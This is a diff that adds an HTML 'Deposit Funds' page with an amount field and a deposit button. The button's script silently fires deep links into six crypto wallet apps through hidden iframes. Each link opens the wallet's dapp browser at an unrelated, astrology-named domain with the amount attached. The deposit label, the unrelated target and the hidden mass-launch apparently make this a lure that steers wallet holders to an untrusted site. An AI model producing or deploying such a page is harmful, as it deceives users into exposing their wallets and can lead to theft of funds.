@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Deposit & Auto-Launch Wallet</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: #050508;
+      background-image: radial-gradient(circle at 50% 0%, #1e1035 0%, #050508 70%);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(18, 16, 26, 0.75);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 24px;
+      padding: 32px 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 40px rgba(98, 32, 251, 0.15);
+      text-align: center;
+    }
+
+    .title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #ffffff 0%, #a5a5a5 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 24px;
+    }
+
+    .input-group {
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .input-label {
+      font-size: 0.8rem;
+      color: #8a8a9e;
+      margin-bottom: 8px;
+      display: block;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    .amount-input {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      padding: 14px 16px;
+      color: #fff;
+      font-size: 1.2rem;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    .amount-input:focus {
+      border-color: #6220fb;
+      box-shadow: 0 0 15px rgba(98, 32, 251, 0.3);
+    }
+
+    /* Custom Luxury Button Style */
+    .custom-btn {
+      width: 100%;
+      border-radius: .25rem;
+      text-transform: uppercase;
+      font-style: normal;
+      font-weight: 600;
+      padding-left: 25px;
+      padding-right: 25px;
+      color: #fff;
+      -webkit-clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
+      clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
+      height: 48px;
+      font-size: 0.8rem;
+      line-height: 48px;
+      letter-spacing: 1.5px;
+      transition: .2s .1s;
+      background-image: linear-gradient(90deg,#1c1c1c,#6220fb);
+      border: 0 solid;
+      overflow: hidden;
+      cursor: pointer;
+    }
+
+    .custom-btn:hover {
+      transition: all .3s ease-in;
+      filter: brightness(1.2);
+    }
+
+    .hidden-iframe {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1 class="title">Deposit Funds</h1>
+
+    <div class="input-group">
+      <label class="input-label" for="amount">Enter Amount want to deposit</label>
+      <input type="number" id="amount" class="amount-input" placeholder="0.00" step="any">
+    </div>
+
+    <button class="custom-btn" onclick="triggerAllWallets()">Deposit</button>
+  </div>
+
+  <!-- Hidden container for iframe triggers -->
+  <div id="iframe-container" class="hidden-iframe"></div>
+
+  <script>
+    function triggerAllWallets() {
+      const amountInput = document.getElementById('amount').value || '0.00';
+      const baseUrl = 'https://deepak-astrology.vercel.app/';
+      
+      // Target URL with ?amount= parameter
+      const targetUrlWithAmount = baseUrl + '?amount=' + encodeURIComponent(amountInput);
+      const encodedTargetUrl = encodeURIComponent(targetUrlWithAmount);
+
+      // 6 Wallets Deep Link Schemes
+      const walletSchemes = [
+        'metamask://dapp/' + targetUrlWithAmount.replace(/^https?:\/\//, ''),
+        'trust://open_url?coin_id=60&url=' + encodedTargetUrl,
+        'cbwallet://dapp?url=' + encodedTargetUrl,
+        'phantom://browse/' + encodedTargetUrl,
+        'rainbow://open?url=' + encodedTargetUrl,
+        'okx://wallet/dapp/details?dappUrl=' + encodedTargetUrl
+      ];
+
+      const container = document.getElementById('iframe-container');
+      container.innerHTML = ''; // Reset container
+
+      // Trigger all schemes in parallel using dynamic iframes
+      walletSchemes.forEach((scheme, index) => {
+        setTimeout(() => {
+          const iframe = document.createElement('iframe');
+          iframe.src = scheme;
+          iframe.style.display = 'none';
+          container.appendChild(iframe);
+        }, index * 100); // 100ms delay to prevent OS lock
+      });
+    }
+  </script>
+
+</body>
+</html>
